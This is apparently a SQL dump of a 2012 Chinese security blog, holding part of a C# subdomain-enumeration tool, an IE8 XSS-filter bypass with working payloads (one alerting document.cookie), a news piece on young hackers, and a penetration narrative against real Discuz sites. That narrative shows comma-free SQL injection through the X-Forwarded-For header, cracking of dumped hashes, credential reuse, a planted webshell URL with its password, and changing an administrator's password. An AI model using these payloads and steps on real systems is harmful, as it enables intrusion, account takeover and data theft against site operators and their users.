m;\r\nusing System.Collections.Generic;\r\nusing System.ComponentModel;\r\nusing System.Data;\r\nusing System.Drawing;\r\nusing System.Linq;\r\nusing System.Text;\r\nusing System.Windows.Forms;\r\nusing System.Net;\r\nusing System.IO;\r\nusing System.Threading;\r\nusing System.Text.RegularExpressions;\r\n\r\nnamespace domainQuery\r\n{\r\n    public partial class FromMain : Form\r\n    {\r\n        public FromMain()\r\n        {\r\n            InitializeComponent();\r\n        }\r\n\r\n        private void btn_query_Click(object sender, EventArgs e)\r\n        {\r\n\r\n            if (\"\".Equals(this.txt_domain.Text))\r\n            {\r\n                MessageBox.Show(\"请输入域名，注意，不要加http,www，格式：qq.com\");\r\n                return;\r\n            }\r\n            this.btn_query.Enabled = false;\r\n            this.btn_queryTitle.Enabled = false;\r\n            this.btn_export.Enabled = false;\r\n            index = 0;\r\n            //创建查询线程\r\n            Thread th = new Thread(new ThreadStart(Query));\r\n\r\n            //开始查询线程\r\n            th.Start();\r\n     \r\n        }\r\n\r\n        private List&lt;String&gt; domains;\r\n\r\n        private void Query() {\r\n\r\n            domains = new List&lt;String&gt;();\r\n\r\n            String domain = this.txt_domain.Text;\r\n            \r\n            String html = GetHttpResponseHtml(domain);\r\n\r\n            MatchCollection mc = Regex.Matches(html, @\"http://S+\" + domain);\r\n            \r\n            //满足pattern的匹配集合               \r\n            foreach (Match m in mc){\r\n                String s = m.ToString();\r\n                if (!domains.Contains(s))\r\n                {\r\n                    domains.Add(s);\r\n                }\r\n            }\r\n            this.lvw_domainInfo.Items.Clear();\r\n            for(int i=0;i&lt;domains.Count;i++){\r\n                ListViewItem lvi = new ListViewItem((i+1)+\"\");\r\n                lvi.SubItems.Add(domains[i]);\r\n                lvi.SubItems.Add(\"\");\r\n                this.lvw_domainInfo.Items.Add(lvi);\r\n            }\r\n\r\n            this.btn_query.Enabled = true;\r\n            this.btn_export.Enabled = true;\r\n            this.btn_queryTitle.Enabled = true;\r\n        }\r\n\r\n        //访问html\r\n        public String GetHttpResponseHtml(String url)\r\n        {\r\n\r\n            try\r\n            {\r\n                //设置模拟http访问参数\r\n                Uri uri = new Uri(\"http://i.links.cn/subdomain/\");\r\n                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uri);\r\n                request.UserAgent = \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\";\r\n                request.Accept = \"*/*\";\r\n                request.Method = \"POST\";\r\n                request.Timeout = 30000;\r\n                request.AllowAutoRedirect = true;\r\n                request.ContentType = \"application/x-www-form-urlencoded\";\r\n                Stream stream = request.GetRequestStream();\r\n                Byte[] b = Encoding.UTF8.GetBytes(\"domain=\" + url + \"&amp;b2=1&amp;b3=1&amp;b4=1&amp;=%B2%E9+%D1%AF\");\r\n                stream.Write(b, 0, b.Length);\r\n                stream.Close();\r\n\r\n                StreamReader sr = new StreamReader(request.GetResponse().GetResponseStream(), Encoding.GetEncoding(\"gb2312\"));\r\n                return sr.ReadToEnd();\r\n\r\n            }\r\n            catch (Exception e)\r\n            {\r\n                MessageBox.Show(\"查询接口失效，请联系作者,QQ:1341413415\");\r\n            }\r\n            return \"\";\r\n        }\r\n       \r\n        private void lvw_domainInfo_MouseDoubleClick(object sender, MouseEventArgs e)\r\n        {\r\n            if (this.lvw_domainInfo.SelectedItems.Count == 0)\r\n            {\r\n                return;\r\n            }\r\n            string target = this.lvw_domainInfo.SelectedItems[0].SubItems[1].Text;\r\n\r\n            try\r\n            {\r\n                System.Diagnostics.Process.Start(\"IEXPLORE.EXE\", target);\r\n            }\r\n\r\n            catch (Exception other)\r\n            {\r\n                MessageBox.Show(\"无法打开IE\");\r\n            } \r\n        }\r\n        private int index = 0;\r\n        private static int maxThead = 10;\r\n        private List&lt;Thread&gt; list_th = new List&lt;Thread&gt;();\r\n        //取网站标题\r\n        public void BeginGetTitle()\r\n        {\r\n            //循环（当扫描下标小于url数量）\r\n            while (index &lt; domains.Count)\r\n            {\r\n                //判断http访问集合中线程的状态，执行完了的线程，移除\r\n                for (int i = 0; i &lt; list_th.Count; i++)\r\n                {\r\n                    Thread th = list_th[i];\r\n                    if (th.ThreadState == ThreadState.Stopped)\r\n                    {\r\n                        th.Abort();\r\n                        this.list_th.Remove(th);\r\n                        i--;\r\n                    }\r\n                }\r\n                //当http访问集合中线程的数量小于最大线程数，在创建线程，维持线程的数量\r\n                if (list_th.Count &lt; maxThead &amp;&amp; index&lt;domains.Count)\r\n                {\r\n                    \r\n                    Thread th = new Thread(new ParameterizedThreadStart(GetTitle)); \r\n                    th.Start(index);\r\n                    index++;\r\n                    list_th.Add(th);\r\n                }\r\n                Thread.Sleep(50);\r\n\r\n\r\n            }\r\n            this.btn_queryTitle.Enabled = true;\r\n            this.btn_query.Enabled = true;\r\n        }\r\n\r\n        private void GetTitle(Object sindex) \r\n        {\r\n            String title = \"未发现\";\r\n            try\r\n            {\r\n                int index = int.Parse(sindex.ToString());\r\n                String url = domains[int.Parse(sindex.ToString())];\r\n                String html = GetHtml(url);\r\n                Regex reg = new Regex(@\"&lt;title&gt;[Ss]+&lt;/title&gt;\");\r\n                Match  m = reg.Match(html);\r\n                if (m.Success)\r\n                {\r\n                    title = m.Groups[0].Value.Replace(\"&lt;title&gt;\", \"\").Replace(\"&lt;/title&gt;\", \"\");\r\n                    \r\n                }\r\n                /*\r\n                int code = GetResponseCode(url + \"/WEB-INF/web.xml\");\r\n\r\n                this.lvw_domainInfo.Items[index].SubItems[1].Text = domains[index];\r\n                this.lvw_domainInfo.Items[index].SubItems[2].Text =title;\r\n                if (code == 200)\r\n                {\r\n                    this.lvw_domainInfo.Items[index].SubItems[1].ForeColor = Color.Red;\r\n                }*/\r\n            }\r\n            catch (Exception e) {\r\n\r\n            }\r\n        }\r\n\r\n        /*抓取html*/\r\n        private String GetHtml(String url) \r\n        {\r\n            //设置模拟http访问参数\r\n            Uri uri = new Uri(url);\r\n            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uri);\r\n            request.UserAgent = \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\";\r\n            request.Accept = \"*/*\";\r\n            request.Method = \"GET\";\r\n            request.Timeout = 20000;\r\n            request.AllowAutoRedirect = true;\r\n            WebResponse response = request.GetResponse();\r\n            return DecodeData(response);\r\n        }\r\n\r\n        private String DecodeData(WebResponse   w)   \r\n        {   \r\n            String   charset   =   null;   \r\n            Regex regEncode = new Regex(\"charset=\\S\"&gt;\");\r\n            Match m = regEncode.Match(w.Headers[\"content-type\"]);\r\n            if (m.Success)\r\n            {\r\n                charset = m.Groups[0].Value;\r\n            }  \r\n\r\n            MemoryStream   rawdata   =   new   MemoryStream();   \r\n            byte   []   buffer   =   new   byte[1024];   \r\n            Stream   rs   =   w.GetResponseStream();   \r\n            int   read   =   rs.Read(buffer,0,buffer.Length);   \r\n            while(read&gt;0)   \r\n            {   \r\n                rawdata.Write(buffer,0,read);   \r\n                read   =   rs.Read(buffer,0,buffer.Length);   \r\n            }   \r\n            rs.Close();   \r\n\r\n            //如果没有发现content-type，只好从脚本中搜索了 \r\n            if(charset==null)   \r\n            {   \r\n                MemoryStream   ms   =   rawdata;   \r\n                ms.Seek(0,SeekOrigin.Begin);   \r\n\r\n                StreamReader   srr   =   new   StreamReader(ms,Encoding.ASCII);   \r\n                String   meta   =   srr.ReadToEnd();   \r\n\r\n                if(meta   !=   null)   \r\n                {   \r\n                    int   start_ind   =   meta.IndexOf(\"charset=\");   \r\n                    int   end_ind   =   -1;   \r\n                    if(start_ind   !=   -1)   \r\n                    {   \r\n                        end_ind   =   meta.IndexOf( \"\"\",start_ind);  \r\n                         if(end_ind   !=   -1)   \r\n                        {   \r\n                        int   start   =   start_ind   +   8;   \r\n                        charset   =   meta.Substring(start,   end_ind   -   start   +   1);   \r\n                        charset   =   charset.TrimEnd(new Char[]{&#39;&gt;&#39;,&#39;\"&#39;});   \r\n                        }   \r\n                    }   \r\n                }   \r\n            }   \r\n\r\n            Encoding   e   =   null;   \r\n            if(charset   ==   null)   \r\n            {   \r\n                e   =   Encoding.UTF8;   \r\n            }   \r\n            else   \r\n            {   \r\n                try   \r\n                {   \r\n                    e   =   Encoding.GetEncoding(charset);   \r\n                }   \r\n                catch(Exception   ee)   //如果编码不存在，使用默认编码 \r\n                {   \r\n                    e   =   Encoding.UTF8;   \r\n                }   \r\n            }   \r\n\r\n            rawdata.Seek(0,SeekOrigin.Begin);   \r\n\r\n            StreamReader   sr   =   new   StreamReader(rawdata,e);\r\n\r\n            return  sr.ReadToEnd();    \r\n        } \r\n\r\n        private int GetResponseCode(String url)\r\n        {\r\n            try\r\n            {\r\n\r\n                //设置模拟http访问参数\r\n                Uri uri = new Uri(url);\r\n                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uri);\r\n                request.UserAgent = \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\";\r\n                request.Accept = \"*/*\";\r\n                request.Method = \"GET\";\r\n                request.Timeout = 10000;\r\n                request.AllowAutoRedirect = false;\r\n                HttpWebResponse response = (HttpWebResponse)request.GetResponse();\r\n                int code = (int)response.StatusCode;\r\n                request.Abort();\r\n                response.Close();\r\n                return (int)response.StatusCode;\r\n            }\r\n           catch (Exception e)\r\n           {\r\n               \r\n           }\r\n            return 0;\r\n        }\r\n\r\n        private void btn_export_Click(object sender, EventArgs e)\r\n        {\r\n            if (domains == null)\r\n            {\r\n                MessageBox.Show(\"没有找到数据，请先查询！\");\r\n            }\r\n            else\r\n            {\r\n                try\r\n                {\r\n                    //保存文件\r\n          \r\n                    FileStream fs = new FileStream(System.IO.Directory.GetCurrentDirectory()+\"/\"+\r\n                        this.txt_domain.Text+ \".txt\", FileMode.OpenOrCreate, FileAccess.Write);\r\n                    StreamWriter sw = new StreamWriter(fs);\r\n                    foreach(String domain in domains)\r\n                    {\r\n                        sw.WriteLine(domain);\r\n                    }\r\n                    sw.Close();\r\n                    fs.Close();\r\n                    MessageBox.Show(\"导出成功！\");\r\n                }\r\n\r\n                catch (Exception ex)\r\n                {\r\n                    MessageBox.Show(\"导出异常！\");\r\n                } \r\n               ;\r\n            }\r\n        }\r\n\r\n        private void btn_queryTitle_Click(object sender, EventArgs e)\r\n        {\r\n            if (domains == null) \r\n            {\r\n                MessageBox.Show(\"请先查询二级域名后，才能查询标题哦！\");\r\n                return;\r\n            }\r\n            this.btn_queryTitle.Enabled = false;\r\n            this.btn_query.Enabled = false;\r\n            //创建查询线程\r\n            Thread th = new Thread(new ThreadStart(BeginGetTitle));\r\n\r\n            //开始查询线程\r\n            th.Start();\r\n        }\r\n\r\n        private void FromMain_Load(object sender, EventArgs e)\r\n        {\r\n\r\n        }\r\n\r\n    }\r\n}</pre>\r\n<p>\r\n	&nbsp;\r\n</p>', 'shack2', '1863', '1', '0', '127.0.0.1', '2012-10-23 02:32:59', '0', '1');
INSERT INTO articleinfo VALUES ('190', '1', '6', 'IE8 xss filter bypass (xss过滤器绕过)', '<p>IE 8 XSS 过滤器绕过。感谢@Sogili牛为本绕过通用性实现上提供的tricks。</p><p>pkav.net</p><p>作者：gainover</p><p>gainover</p><p> </p><p class=\"detail\">1. 在IE8中，可以通过 &lt;xml&gt; &lt;?import&gt; + &lt;t:set ..&gt; 的方式来构成一个XSS vector。<br /><br />在测试过程中发现， &lt;?import&gt; 同样可写为 &lt;import&gt;。<br /><br />也就是说。下面的代码都可以运行JS代码。<br /><br /></p><pre></pre><pre class=\"brush:html;toolbar:false;\">&lt;html&gt;      \r\n&lt;body&gt;      \r\n&lt;div&gt;      \r\n&lt;div id=\"x\"&gt;x&lt;/div&gt;      \r\n&lt;?xml:namespace prefix=\"t\"&gt;      \r\n&lt;?import namespace=\"t\" implementation=\"#default#time2\"&gt;      \r\n&lt;t:set attributeName=\"innerHTML\" targetElement=\"x\" to=\"&amp;lt;img&amp;#11;src=x:x&amp;#11;onerror&amp;#11;=alert(1)&amp;gt;\"&gt;      \r\n&lt;/div&gt;      \r\n&lt;/body&gt;      \r\n&lt;/html&gt;</pre><pre class=\"brush:html;toolbar:false;\">&lt;html&gt;      \r\n&lt;body&gt;      \r\n&lt;div&gt;      \r\n&lt;div id=\"x\"&gt;x&lt;/div&gt;      \r\n&lt;xml:namespace prefix=\"t\"&gt;      \r\n&lt;import namespace=\"t\" implementation=\"#default#time2\"&gt;      \r\n&lt;t:set attributeName=\"innerHTML\" targetElement=\"x\" to=\"&amp;lt;img&amp;#11;src=x:x&amp;#11;onerror&amp;#11;=alert(1)&amp;gt;\"&gt;      \r\n&lt;/div&gt;      \r\n&lt;/body&gt;      \r\n&lt;/html&gt;</pre><pre></pre><p class=\"detail\"><br /><br />2. 利用这个技巧，我发现可以成功绕过IE 8 的 xss filter <br /><br />测试例子如下：</p><pre class=\"brush:html;toolbar:false;\">http://xsst.sinaapp.com/example/1-1.php?page=&lt;div id=x&gt;x&lt;/div&gt;&lt;xml:namespace prefix=t&gt;&lt;import namespace=t implementation=%23default%23time2&gt;&lt;t:set/attributename=innerHTML targetElement=x to=%26lt;img%26%2311;src=x:x%26%2311;onerror%26%2311;=alert%26%23x28;1%26%23x29;%26gt;&gt;</pre><p class=\"detail\"> </p><p class=\"detail\"><br /><br />如果用&lt;?import..&gt;，则会触发过滤器。<br /><br />3. 当然，上面这个代码，只适用于 &lt;HTML标签&gt;{输出在这里}&lt;/HTML标签&gt; 的情况。<br /><br />我们经常会遇到类似 &lt;input type=&quot;text&quot; value=&quot;{输出在这里}&quot;&gt; &nbsp;的情况。<br /><br />这样一来，我们需要在代码前面加上 &quot;&gt; 来闭合HTML属性。<br /><br />但是问题来啦， &quot;&gt; 会触发XSS过滤器，过滤掉我们代码中的敏感词。<br /><br />@jackmasa (https://twitter.com/jackmasa)，也就是我们乌云的 @Sogili 牛，给了一个绕过的tricks， &quot;x&gt; 就不会触发XSS过滤器了， x代表任意字母。 非常感谢。<br /><br />这样一来，我们上面的代码可以进一步通用化。<br /><br /></p><pre></pre><pre class=\"brush:html;toolbar:false;\">http://www.xxxx.com/product.php?search=\"id=&gt;&lt;div/id=x&gt;x&lt;/div&gt;&lt;xml:namespace prefix=t&gt;&lt;import namespace=t implementation=%23default%23time2&gt;&lt;t:set/attributename=innerHTML targetElement=x to=%26lt;img%26%2311;src=x:x%26%2311;onerror%26%2311;=alert%26%23x28;document.cookie%26%23x29;%26gt;&gt;</pre><pre></pre><p class=\"detail\"><br /><br />4. 至于具体怎么利用，恩，大家自己看着办。</p><p class=\"detail\"> </p><p class=\"detail\"><img style=\"float:none;\" border=\"0\" hspace=\"0\" vspace=\"0\" src=\"/static/uploadImage/1351215096864.jpg\" /></p><p> </p>', 'shack2', '1141', '1', '0', '127.0.0.1', '2012-10-25 21:31:57', '0', '0');
INSERT INTO articleinfo VALUES ('191', '1', '9', '给跪了，看看这些一战成名的90后高端技术宅', '<h5>导读：谁不想有个乔布斯和盖茨梦，谁不想在青葱之时便得资本和大佬青睐。在中国，亦不乏如此的天才少年，一技之特别长并以此一战成名。</h5><div class=\"content\"><p style=\"text-align:center;\"><img alt=\"给跪了，看看这些一战成名的90后技术宅！\" src=\"/static/uploadImage/1351240420667.jpg\" /></p><br />谁不想有个乔布斯和盖茨梦，谁不想在青葱之时便得资本和大佬青睐。在中国，亦不乏如此的天才少年，一技之特别长并以此一战成名。<br /><br />昨日由红杉资本和真格基金共同出资组建的Peak Labs，推出了其三款令人眼前一亮的应用：多维非编程可视化数据分析工具Jigsaw、重新书写架构的猛犸5浏览器以及一站式多内容呈现搜索产品Zine。而该实验室的创始人正是年仅20岁的北京大学生季逸超，他最初名满IT圈个故事还要从就读北大附中时推出猛犸浏览器说起。<br /><br />如此的少年极客还有谁？我们将要介绍的下述三位，在传统意义上并不是中国家长眼中绝对“品学兼优”的孩子，他们有的并未进入高校读书，有的在学校中偏科严重，但这都不阻碍他们在自身领域的翘楚：<br /><br /><strong><span style=\"font-size:16px;\">季逸超：开发猛犸 19岁获红杉青睐的高端技术宅</span></strong><br /><br />19岁的高中生季逸超因为猛犸浏览器而在极客圈一炮走红，成为少年极客的典型。<br /><br />2012年10月24日21:37，季逸超在他的微博上公布了猛犸浏览器5.0版本的发布视频和下载地址。也就是在这天下午，他的实验室Peak Labs首场发布会(Event Zero)在蓝色港湾“传奇时代”影城顺利举办。<br /><br />在这次发布会中，他也充分体现出了自己的极客范，一边宣称不请配音，另一边“产品设计、代码、美术、视频、制作、录音一如既往地自己干”。而由这位92年出生的资深技术宅开发的猛犸浏览器早就被国际知名测评网站App Advice评价为“重新定义了浏览器的标准”。公开数据显示，它是iPhone 上个人开发的浏览器里下载量最大的产品，每天下载量在100到200次左右。<br /><br />除了猛犸浏览器，季逸超还在2012年年初推出了iPhone手势键盘Rasgueado，这款手势键盘带来的革命是它已经不仅仅是一款文本编辑器，还是一款便捷的APP。6月，Rasgueado已经更新到3.0版本。<br /><br />季逸超目前在北京念大学，他在微博上的自我介绍是“90后码农,废柴Hacker,资深深深深深深死宅.Peak-Labs Labmen 001, El Psy Congroo…”介绍中提到的El Psy Congroo…即“保持冷静的思维”，是日本动漫《命运石之门》中的主角冈部伦太郎的口头禅。冈部伦太郎自称“狂乱的疯狂科学家”，是片中未来道具研究所001号成员。有趣的是，热爱动漫的季逸超也自封“Peak-Labs Labmen 001”。<br /><br />Peak Labs正是他成立的以贝尔和施乐为目标的实验室，这个实验室已经获得红杉中国和徐小平创办的真格基金的天使投资。他在自己的新浪微博上说过，这个实验室“要做最狂最新鲜的事”。<br /><br /><strong><span style=\"font-size:16px;\">刘靖康： “听”出周鸿祎手机号码的挂科生</span></strong><br /><br />在虎嗅《<a href=\"http://www.huxiu.com/article/3227/1.html\">技术宅逆天了！如何从按键音中听出周鸿祎的手机号码</a>》一文中就曾详细的描述过这位大虾的伟业——南大学生刘靖康通过记者采访时的拨号声，分析出360董事长周鸿祎的手机号码。<br /><br />“如何从拨号音中听出360总裁周鸿祎的手机号码”，9月初，这条长微博被疯狂转发。帖子的作者详细记录了自己破解周鸿祎手机号的过程：从一则网上流传的采访视频获取拨打周鸿祎手机的拨号音、然后使用软件把它转换成频谱图、再通过软件放大拨号音、最后分析获取手机号码。<br /><br />为了验证分析结果，他还拨打了这个号码，事实证明这也确实就是周鸿祎的手机号。不少网友惊呼：“技术宅要逆天了！”<br /><br />不久周鸿祎转发了这条微博，并感慨地说“这位同学确实能干”，还邀请他去360实习。李开复也在微博上向他抛出橄榄枝。<br /><br />帖子的作者是南京大学2010届软件工程专业的学生刘靖康。此前他初尝“走红”滋味是因为盗用7000张图片做出南京大学各院系的“标准脸”，还被网友称为“标准哥”。这次破译周鸿祎的手机号码，则是受了《名侦探柯南》中类似情节的启发，也参考了贝尔发明电话的原理。<br /><br />不过有趣的是，虽然刘靖康在网上以“标准哥”、“技术帝”的名头走红，专业成绩却不怎么好，2011学年有三门专业课不及格。私底下，他对软件学院的专业课并没有那么上心，反而喜欢鼓捣一些自己感兴趣的发明设计。<br /><br /><strong><span style=\"font-size:16px;\">张瑞冬：“捕获”马化腾微信账号与其谈笑风生</span></strong><br /><br />９０后张瑞冬发现微信密码漏洞，通过破解腾讯CEO马化腾、主持人柳岩等名人身边人的微信账号，和名人亲密“对话”。<br /><br />除了周鸿祎的电话号码被90后极客分析出来之外，9月4日，马化腾的微信账号也被一位年轻的极客找出。这次被破解的是微信的漏洞，而破解技术帖最早由一位ID为 “only_guest”的网友发表在国内漏洞报告平台WooYun论坛。他的真名叫张瑞冬，只有21岁。<br /><br />据《现代快报》报道，张瑞冬的破解过程前后不到1个小时，就是利用已知的绑定微信的电话号码，绕过验证码进行密码修改。通过几个试验证实之后，他通过WooYun论坛立刻向腾讯微信方面反映。晚上 12点多，“@腾讯应急安全响应中心”腾讯官方微博对此漏洞进行转发确认，承认了张瑞冬所做的补漏工作。<br /><br />这是一位自学成才的极客：14岁就在黑客网站做管理员，中学毕业以后就出来从事网络安全工作，21岁的他已经正式工作四年。至于为什么乐意查找漏洞，他觉得自己把漏洞找出来，能让互联网产品更完善。<br /><br />短短两年时间，张瑞冬已经在WooYun论坛提交了62个漏洞。而出于保护隐私的需要，对于一般漏洞他都是拿自己的账户作为试验对象。出现类似于微信这样涉及公共信息的，一旦证实漏洞存在，他会立即向厂家反映。 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</div><p> </p>', 'shack2', '1235', '1', '0', '127.0.0.1', '2012-10-26 04:34:21', '0', '1');
INSERT INTO articleinfo VALUES ('192', '1', '6', '渗透实战:Discuz 0day沦陷discuz官网', '<p>\n    渗透实战:Discuz 0day沦陷discuz官网\n</p>\n<p>\n    来源<font color=\"#000000\">：</font>http://hi.baidu.com/virtualdevil/item/6e9fa5c4f5a0d5d39644528b\n</p>\n<p>\n    前言: 此次检测纯属偶然, 源于Errorera同学一直想拿下腾讯, 然后找腾讯换ipad玩, 结果搞着搞着就把目标对准Discuz了, 反正Discuz也属于腾讯业务, 估计搞下也能换ipad, Errorera同学怀着这样的美好愿望就开搞了!\n</p>\n<p>\n    此文所有图片均由Errorera同学提供, 本来我想等我把文章写了他再提交的, 可丫太着急要ipad了, 所以瞒着我直接提交了!! 所以现在所有漏洞都已经修补, 导致我想截图都截不了了… 还好他已经写了一篇文章, 我就将就直接修改下拿上来吧~\n</p>\n<p>\n    过程Top1: Dev.Discuz.Org注射: (此过程前几日已在土司发了部分内容, 之后自己删除, 原因后面会提到)\n</p>\n<p>\n    下午我正在卖衣服, 突然Errorera就在群里说找到突破口了, 原来Dev.Discuz.Org这个站是Discuz的开发者论坛, 但是却很二逼的直接把”X-Forwarded-For”直接带入了数据库, 且无任何过滤, so..注射就这样产生了~ 首先直接打开是显示登录页面:<br />\n    <img src=\"/static/uploadImage/1351734059332.png\" width=\"734\" height=\"447\" /><br />\n    然后再修改下X-Forwarded-For的值为111′, 再刷新下页面Mysql就报错了:<br />\n    <img src=\"/static/uploadImage/1351734060359.png\" width=\"758\" height=\"152\" /><br />\n    既然存在注射, 那首先想的肯定是怎么获取到我们想要的信息了, 用户数据库? 亦或是ROOT密码? 还是直接into_Outfile呢 = =? 不过这都是废话, 要是这么简单搞定的话也就没后话了~<br />\n    首先看这Mysql信息肯定是使用的DISCUZ来构建的, 但是具体是什么版本就不知道了, 所以我就先猜了下字段数, 想用常规方法爆出东西, 最后确定字段数为5, 然后就顺手union了, 殊不知过滤了逗号, 顿时傻逼…..<br />\n    以上图没截到, 所以就一笔带过吧~ 随后多次测试, 使用了网上提到的JOIN方法成功突破:\n</p>\n<pre>\n    127&apos; UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)#\n</pre>\n<p>\n    UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b实际上也就相当于UNION SELECT 1,2<br />\n    正当我以为会出现熟悉的1 2 3 4 5的时候, 却直接登录进去了….<br />\n    <img src=\"/static/uploadImage/1351734060843.png\" width=\"758\" height=\"256\" /><br />\n    这dz是什么版本也不知道, 更不知道他的具体写法, 目测的话应该是在判断登录与未登录的时候出现的问题, 可能在判断的时候用到了mysql查询, 然后把登陆成功用户状态的登录状态写入数据库, 当然以上只是猜想, 具体是咋回事暂且不清楚o(∩_∩)o~ 不过这里只是看上去登录进去了, 提示不欢迎我 = =.. 于是我又刷新了下, 就立马笑了~~<br />\n    <img src=\"/static/uploadImage/1351734061986.png\" width=\"758\" height=\"179\" /><br />\n    既然他都这么客气的就把md5给我爆出来了, 那我也就不用再客气了, 测试了几遍发现这里我把X-Forwarded-For改为空的话还是会提示不欢迎我, 然后我就按照注射经典步骤, 祭出了传说中的Order By~ 直接把X-Forwarded-For的值改为\n</p>\n<pre>\n    127&apos; order by 4#\n</pre>\n<p>\n    之后刷新, 然后我又笑了….<br />\n    <img src=\"/static/uploadImage/1351734062799.jpg\" width=\"560\" height=\"392\" /><br />\n    真不知道这奇葩的dz是怎么写的, 一个注射沦陷全站啊~~ 可能这里细心的基友会发现怎么这个登录进去的用户名和之前的用户名不一样啊, 待我细细到来, 在开头union的时候我就想过既然直接登录进去了, 会不会直接把我union出来的值直接当成用户的uid查询了呢, 于是经过测试, 才发现原来\n</p>\n<pre>\n    127&apos; UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)#\n</pre>\n<p>\n    里面的\n</p>\n<pre>\n    JOIN (SELECT 2)b\n</pre>\n<p>\n    就可以定义成用户的uid, 这里我改为2, 就是李国德这个用户, 改为1的话, 自然就是admin了o(∩_∩)o~<br />\n    既然登录了, 那自然就是拿shell了, 拿到shell好进一步搞, 但是这次, 我哭了~~<br />\n    <img src=\"/static/uploadImage/1351734063344.png\" width=\"758\" height=\"267\" /><br />\n    既然后台进不去, 那先去前台转转来, 转就转到了一个屌丝板块”Discuz 安全问题”, 然后点进去, 就各种0day了~~~<br />\n    <img src=\"/static/uploadImage/1351734063848.png\" width=\"474\" height=\"222\" /><br />\n    好吧, 既然到这份上我也不卖啥关子了, 自从上次在土司发了以后就很多人找我要0day, 其实这板块里的漏洞都是以前的老洞, 有别人提交的, 也有内部人员自己审计的, 所以基本上都修复了, 也可以算是Xday吧~<br />\n    然后继续渗透, 发现此站目录下有一个名为wiki的二级目录, 是用的MeadiWiki搭建的, 通过论坛爆了几个用户的密码, 进去都不是管理员, 也没拿到shell~ MeadiWiki的管理员用户是Sup, 用admin的密码也没搞进去, 并且之前那个注入点也不是root权限 = =<br />\n    一直到这里, 还没进行到下一步, 这个站主页就变空白了, 估计是被管理员发现了, 然后Errorera就把这个注射提交给腾讯了, 结果lake2却说这是dz的站, 希望我们别欺负dz…. 结果某同学很窝火, ipad没拿到, 还被泼了冷水, 当时Errorera同学就立誓要拿到ipad….\n</p>\n<p>\n    过程Top2: Dev.Discuz.Org再次注射脱出用户数据库:<br />\n    几日过后, 我卖完衣服上qq, Errorera给我说那个站恢复了, 竟然还没补洞.. 既然还有机会那我就把土司的那个帖子先删了, 要是有别的大黑客去捣乱那就不好搞了..<br />\n    既然他赤果果的挑衅我, 既然这样也就没必要客气了, 继续我们的计划, 我立马就用易语言写了个程序批量把所有用户的密码给跑出来了:<br />\n    <img src=\"/static/uploadImage/1351734064161.png\" width=\"758\" height=\"304\" /><img src=\"/static/uploadImage/1351734064988.png\" width=\"649\" height=\"473\" /><br />\n    跑完以后一共有200多个用户, 我们就打算用这些用户进一步社工Discuz的其他网站, 这时候我发现跑出来的用户密码里面有一个名为test的用户, 我在想这论坛其他用户都是直接用中文姓名注册的用户名, 这个test很可能是管理员测试用的, 立马上cmd5解密出其密码为”xi***********6″, 然后尝试了下用这个密码登录MeadiWiki的Sup用户, 成功登录之.. 但是依然没拿到shell, 对MeadiWiki也不熟, google了下也没找到方法, 于是只好放弃了~\n</p>\n<p>\n    过程Top3: U.Discuz.Net沦陷:<br />\n    上一步中已经基本确认了管理员的常用密码, 而这个站又是dz的开发者用的, 那么很有可能这个密码也是Discuz主站的管理员或者维护员或者服务器运维员的密码, 于是用这个密码通杀进了几个Discuz的分站, 比如Demo.Discuz.Net等, 不过安全性都做的比较好, 后台都是清一色的403, 而后又去试了试5d6d等Didcuz的旗下业务, 都是毫无收获, 随后索性直接开搞www.discuz.net的旁站~<br />\n    因为我知道主服务器的安全肯定不会亚于哪些分站, 所以暂时没有尝试通过WEB方式来拿shell, 直接扫出了ftp端口2121, 然后各种组合, 各种爆破都无果, 这时才瞄准了旁站U.Discuz.Net, 直接用帐号Sup, 密码xi***********6登录了进去, 由于使用的是UCHome, 且后台也没有403. 那么你懂我懂相信大家也都懂了..<br />\n    <img src=\"/static/uploadImage/1351734065785.png\" width=\"758\" height=\"376\" /><img src=\"/static/uploadImage/1351734066836.png\" width=\"758\" height=\"440\" /><br />\n    成功拿到shell:http://u.discuz.net/home/data/a.php, 密码cmd<br />\n    <img src=\"/static/uploadImage/1351734067589.png\" width=\"758\" height=\"413\" /><br />\n    主站近在眼前, 但是目录权限分配了, 跨不过去也是浮云, Linux内核是2.6.18, 没打补丁, 但是也没反弹出来, 要是能反弹出来的话提权应该没什么大问题, 然后翻了下翻到了PureFTP等也没啥大的收货, 最终在根目录config.php文件里翻到了主站的UC通讯配置信息:<br />\n    <img src=\"/static/uploadImage/1351734068108.png\" width=\"492\" height=\"495\" /><br />\n    接下来数据库神马的就都是浮云了:<br />\n    <img src=\"/static/uploadImage/1351734068436.png\" width=\"555\" height=\"352\" /><img src=\"/static/uploadImage/1351734068746.png\" width=\"758\" height=\"546\" /><br />\n    一共200万左右的用户数据, 我估摸着里面90%都是网站站长吧.. 如果数据库被脱危害性可想而知, 不过我可是良民, 借此郑重声明下: 此数据库我丝毫未动, 更未脱裤, 管理员可查Mysql查询记录!<br />\n    咱可是良民不是, 脱裤这种事情还是留给Helen或者TH4ck等大牛来完成吧, 最后update了戴志康老板的密码, 不过结果我也想到了, 后台是403~\n</p>\n<p>\n    End:<br />\n    至此, 这次检测也就结束了, 这是遇上我等菜鸟, 要是遇上Helen之流, 相信大家都懂的..<br />\n    这次也看出一个密码多个地方使用尤其是网站管理员的话这样是非常危险的, 暴露密码就等于你的站也就是完了!<br />\n    关于什么修复方法啥的我也就不装逼啰嗦了, 我相信腾讯和康盛的大牛比我有办法的多了!<br />\n    最终腾讯答应了给Errorera童鞋发放ipad一部, 那丫估计现在睡觉都要乐醒了 o(∩_∩)o ~\n</p>\n<p>\n     \n</p>', 'shack2', '1251', '1', '0', '127.0.0.1', '2012-11-01 09:50:43', '0', '2');
